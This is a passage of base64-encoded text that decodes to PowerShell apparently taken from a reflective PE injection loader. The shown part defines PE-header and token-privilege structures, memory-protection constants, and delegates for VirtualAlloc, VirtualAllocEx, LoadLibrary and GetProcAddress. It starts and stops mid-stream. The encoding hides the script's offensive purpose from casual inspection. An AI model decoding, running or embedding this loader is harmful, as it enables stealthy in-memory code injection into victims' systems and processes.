G9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gMTApKQogICAgICAgICRlX3JlczJGaWVsZC5TZXRDdXN0b21BdHRyaWJ1dGUoJEF0dHJpYkJ1aWxkZXIpCgogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9sZmFuZXcnLCBbSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9ET1NfSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKSAgIAogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRE9TX0hFQURFUiAtVmFsdWUgJElNQUdFX0RPU19IRUFERVIKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9TRUNUSU9OX0hFQURFUgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfU0VDVElPTl9IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA0MCkKCiAgICAgICAgJG5hbWVGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTmFtZScsIFtDaGFyW11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKQogICAgICAgICRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheQogICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gOCkpCiAgICAgICAgJG5hbWVGaWVsZC5TZXRDdXN0b21BdHRyaWJ1dGUoJEF0dHJpYkJ1aWxkZXIpCgogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbFNpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxBZGRyZXNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZSYXdEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9SYXdEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9SZWxvY2F0aW9ucycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvTGluZW51bWJlcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUmVsb2NhdGlvbnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mTGluZW51bWJlcnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9TRUNUSU9OX0hFQURFUiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NFQ1RJT05fSEVBREVSIC1WYWx1ZSAkSU1BR0VfU0VDVElPTl9IRUFERVIKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9CQVNFX1JFTE9DQVRJT04KICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0JBU0VfUkVMT0NBVElPTicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsQWRkcmVzcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mQmxvY2snLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfQkFTRV9SRUxPQ0FUSU9OID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfQkFTRV9SRUxPQ0FUSU9OIC1WYWx1ZSAkSU1BR0VfQkFTRV9SRUxPQ0FUSU9OCgogICAgICAgICNTdHJ1Y3QgSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0lNUE9SVF9ERVNDUklQVE9SJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjApCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RpbWVEYXRlU3RhbXAnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZvcndhcmRlckNoYWluJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaXJzdFRodW5rJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX0lNUE9SVF9ERVNDUklQVE9SID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgLVZhbHVlICRJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUgoKICAgICAgICAjU3RydWN0IElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0VYUE9SVF9ESVJFQ1RPUlknLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA0MCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vclZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ05hbWUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2UnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mRnVuY3Rpb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZk5hbWVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZGdW5jdGlvbnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZk5hbWVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZOYW1lT3JkaW5hbHMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkgLVZhbHVlICRJTUFHRV9FWFBPUlRfRElSRUNUT1JZCiAgICAgICAgCiAgICAgICAgI1N0cnVjdCBMVUlECiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdMVUlEJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvd1BhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0hpZ2hQYXJ0JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJExVSUQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMVUlEIC1WYWx1ZSAkTFVJRAogICAgICAgIAogICAgICAgICNTdHJ1Y3QgTFVJRF9BTkRfQVRUUklCVVRFUwogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTFVJRF9BTkRfQVRUUklCVVRFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDEyKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTHVpZCcsICRMVUlELCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQXR0cmlidXRlcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRMVUlEX0FORF9BVFRSSUJVVEVTID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTFVJRF9BTkRfQVRUUklCVVRFUyAtVmFsdWUgJExVSURfQU5EX0FUVFJJQlVURVMKICAgICAgICAKICAgICAgICAjU3RydWN0IFRPS0VOX1BSSVZJTEVHRVMKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ1RPS0VOX1BSSVZJTEVHRVMnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAxNikKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ByaXZpbGVnZUNvdW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcml2aWxlZ2VzJywgJExVSURfQU5EX0FUVFJJQlVURVMsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFRPS0VOX1BSSVZJTEVHRVMgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBUT0tFTl9QUklWSUxFR0VTIC1WYWx1ZSAkVE9LRU5fUFJJVklMRUdFUwoKICAgICAgICByZXR1cm4gJFdpbjMyVHlwZXMKICAgIH0KCiAgICBGdW5jdGlvbiBHZXQtV2luMzJDb25zdGFudHMKICAgIHsKICAgICAgICAkV2luMzJDb25zdGFudHMgPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKICAgICAgICAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fQ09NTUlUIC1WYWx1ZSAweDAwMDAxMDAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTUVNX1JFU0VSVkUgLVZhbHVlIDB4MDAwMDIwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX05PQUNDRVNTIC1WYWx1ZSAweDAxCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9SRUFET05MWSAtVmFsdWUgMHgwMgogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfUkVBRFdSSVRFIC1WYWx1ZSAweDA0CiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9XUklURUNPUFkgLVZhbHVlIDB4MDgKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEUgLVZhbHVlIDB4MTAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEVfUkVBRCAtVmFsdWUgMHgyMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUgLVZhbHVlIDB4NDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX0VYRUNVVEVfV1JJVEVDT1BZIC1WYWx1ZSAweDgwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9OT0NBQ0hFIC1WYWx1ZSAweDIwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1JFTF9CQVNFRF9BQlNPTFVURSAtVmFsdWUgMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1JFTF9CQVNFRF9ISUdITE9XIC1WYWx1ZSAzCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0RJUjY0IC1WYWx1ZSAxMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fRElTQ0FSREFCTEUgLVZhbHVlIDB4MDIwMDAwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX0VYRUNVVEUgLVZhbHVlIDB4MjAwMDAwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX1JFQUQgLVZhbHVlIDB4NDAwMDAwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX1dSSVRFIC1WYWx1ZSAweDgwMDAwMDAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEIC1WYWx1ZSAweDA0MDAwMDAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTUVNX0RFQ09NTUlUIC1WYWx1ZSAweDQwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9GSUxFX0VYRUNVVEFCTEVfSU1BR0UgLVZhbHVlIDB4MDAwMgogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfRExMIC1WYWx1ZSAweDIwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFIC1WYWx1ZSAweDQwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCAtVmFsdWUgMHgxMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fUkVMRUFTRSAtVmFsdWUgMHg4MDAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fUVVFUlkgLVZhbHVlIDB4MDAwOAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRPS0VOX0FESlVTVF9QUklWSUxFR0VTIC1WYWx1ZSAweDAwMjAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTRV9QUklWSUxFR0VfRU5BQkxFRCAtVmFsdWUgMHgyCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRVJST1JfTk9fVE9LRU4gLVZhbHVlIDB4M2YwCiAgICAgICAgCiAgICAgICAgcmV0dXJuICRXaW4zMkNvbnN0YW50cwogICAgfQoKICAgIEZ1bmN0aW9uIEdldC1XaW4zMkZ1bmN0aW9ucwogICAgewogICAgICAgICRXaW4zMkZ1bmN0aW9ucyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICRWaXJ0dWFsQWxsb2NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MKICAgICAgICAkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEFsbG9jIC1WYWx1ZSAkVmlydHVhbEFsbG9jCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgKICAgICAgICAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0V4QWRkciwgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEFsbG9jRXggLVZhbHVlICRWaXJ0dWFsQWxsb2NFeAogICAgICAgIAogICAgICAgICRtZW1jcHlBZGRyID0gR2V0LVByb2NBZGRyZXNzIG1zdmNydC5kbGwgbWVtY3B5CiAgICAgICAgJG1lbWNweURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJG1lbWNweSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtZW1jcHlBZGRyLCAkbWVtY3B5RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgbWVtY3B5IC1WYWx1ZSAkbWVtY3B5CiAgICAgICAgCiAgICAgICAgJG1lbXNldEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgbXN2Y3J0LmRsbCBtZW1zZXQKICAgICAgICAkbWVtc2V0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJG1lbXNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtZW1zZXRBZGRyLCAkbWVtc2V0RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgbWVtc2V0IC1WYWx1ZSAkbWVtc2V0CiAgICAgICAgCiAgICAgICAgJExvYWRMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgTG9hZExpYnJhcnlBCiAgICAgICAgJExvYWRMaWJyYXJ5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKICAgICAgICAkTG9hZExpYnJhcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTG9hZExpYnJhcnlBZGRyLCAkTG9hZExpYnJhcnlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMb2FkTGlicmFyeSAtVmFsdWUgJExvYWRMaWJyYXJ5CiAgICAgICAgCiAgICAgICAgJEdldFByb2NBZGRyZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0UHJvY0FkZHJlc3MKICAgICAgICAkR2V0UHJvY0FkZHJlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1N0cmluZ10pIChbSW50UHRyXSkKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0UHJvY0FkZHJlc3NBZGRyLCAkR2V0UHJvY0FkZHJlc3NEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFt